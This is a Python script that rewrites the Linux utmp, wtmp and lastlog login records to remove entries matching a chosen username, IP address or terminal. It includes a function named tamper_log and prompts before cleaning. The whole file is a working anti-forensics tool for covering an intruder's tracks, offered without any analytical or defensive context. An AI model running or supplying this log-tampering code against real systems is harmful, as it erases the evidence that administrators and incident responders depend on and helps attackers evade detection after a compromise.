# -*- coding:utf-8 -*-

import struct
import pwd
import argparse
import sys
import time


def match_xtmp():
    '''
    open xtmp log file and search for record.
    return **unmatched** record.
    '''

    try:
        matched = []
        xtmp = ""
        with open(FILENAME, 'rb') as fp:
            while 1:
                bytes = fp.read(XTMP_STRUCT_SIZE)
                if not bytes:
                    break

                record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in struct.unpack(XTMP_STRUCT, bytes)]
                if all([compare(clues[0], record[4]),  # search username
                        compare(clues[1], record[5]),  # search ip
                        compare(clues[2], record[2])]):  # search ttyname
                    matched.append("  [-]"+" ".join([record[4], record[2], record[5]]))
                else:
                    xtmp += bytes

        if matched:
            Print("[*]found matched log in "+FILENAME, level=1, color="green")
            for i in matched:
                Print(i, level=1, color="white")
            if raw_input("[?]clean them? [y]/n > ") != "n":
                return xtmp
            else:
                Print("  [!]aborted", level=1, color="yellow")
        else:
            Print("[*]not found!", level=1, color="green")

    except Exception as e:
        Print('match log: %s falied\n%s' % (FILENAME, str(e)), level=0, color="red")


def match_lastlog():
    '''
    open lastlog log file and search for record.
    return **unmatched** record.
    '''

    try:
        pw = pwd.getpwnam(USERNAME)
    except:
        Print("[*]not found!", level=1, color="green")
        return

    tmp_id = 0
    lastlog = ''
    matched = []
    try:
        with open(FILENAME, "rb") as fp:
            while 1:
                bytes = fp.read(LASTLOG_STRUCT_SIZE)
                if not bytes:
                    break

                record = [(lambda s: str(s).split("\0", 1)[0])(i) for i in struct.unpack(LASTLOG_STRUCT, bytes)]
                if tmp_id == pw.pw_uid:
                    matched.append("  [-]"+" ".join([
                        USERNAME,
                        time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(int(record[0]))),
                        record[2],
                    ]))
                else:
                    lastlog += bytes

                tmp_id += 1

        if matched:
            Print("[*]found matched log in "+FILENAME, level=1, color="yellow")
            for i in matched:
                Print(i, level=1, color="white")
            if raw_input("[?]clean them? [y]/n > ") != "n":
                return lastlog
            else:
                Print("  [!]aborted", level=1, color="yellow")
        else:
            Print("[*]not found!", level=1, color="green")
    except Exception as e:
        Print('match log: %s falied\n%s' % (FILENAME, str(e)), level=0, color="red")


def tamper_log(contents):
    '''
    tamper the log files.
    '''
    try:
        with open(FILENAME, 'w+b') as fp:
            fp.write(contents)
        Print("  [-]success!", level=1, color="green")
    except Exception as e:
        Print('  [-]clear log: %s falied\n%s' % (FILENAME, str(e)), level=0, color="red")


def compare(a, b):
    '''
    unassigned == None == True
    '''

    return a == b or a == None


def put_color(string, color):
    colors = {
        u"gray": "2",
        u"red": "31",
        u"green": "32",
        u"yellow": "33",
        u"blue": "34",
        u"pink": "35",
        u"cyan": "36",
        u"white": "37",
    }

    return u"\033[40;1;%s;40m%s\033[0m" % (colors[color], string)


def Print(msg, level, color):
    '''
    control output
    '''

    print(put_color(msg, color))


# --------------------- CONSTANTS ---------------------
PATH = [
    "/var/run/utmp",
    "/var/log/wtmp",
    "/var/log/lastlog"
]

LASTLOG_STRUCT = 'I32s256s'
LASTLOG_STRUCT_SIZE = struct.calcsize(LASTLOG_STRUCT)

XTMP_STRUCT = 'hi32s4s32s256shhiii4i20x'
XTMP_STRUCT_SIZE = struct.calcsize(XTMP_STRUCT)
# -----------------------------------------------------


parser = argparse.ArgumentParser()
parser.add_argument('-m', '--mode', type=int, required=True,
                    choices=[0, 1, 2], help='assign log file: [0:utmp]; 1:wtmp; 2:lastlog')

parser.add_argument('-u', '--username', help='match records based on username')
parser.add_argument('-i', '--ip', help='match records based on ip')
parser.add_argument('-t', '--ttyname', help='match records based on ttyname')

parser.add_argument('-f', '--filename', help='match records based on filename')

parser.add_argument('-v', '--verbose', default=1, type=int,
                    choices=[0, 1, 2], help='how much information you want: 0:silent; [1]; 2:debug')

args = parser.parse_args()

MODE = args.mode

USERNAME = args.username
IP = args.ip
TTYNAME = args.ttyname

FILENAME = args.filename if args.filename else PATH[MODE]

VERBOSE = args.verbose


if MODE in [0, 1]:
    clues = [USERNAME, IP, TTYNAME]
    if not any(clues):
        sys.exit(put_color("give me a username or ip or ttyname", "red"))

    # 0: change command: last
    # 1: change command: lastlog
    new_data = match_xtmp()
    if new_data != None:
        tamper_log(new_data)
else:
    # 2: change command: w
    if not USERNAME:
        sys.exit("give me a username")

    new_data = match_lastlog()
    if new_data != None:
        tamper_log(new_data)
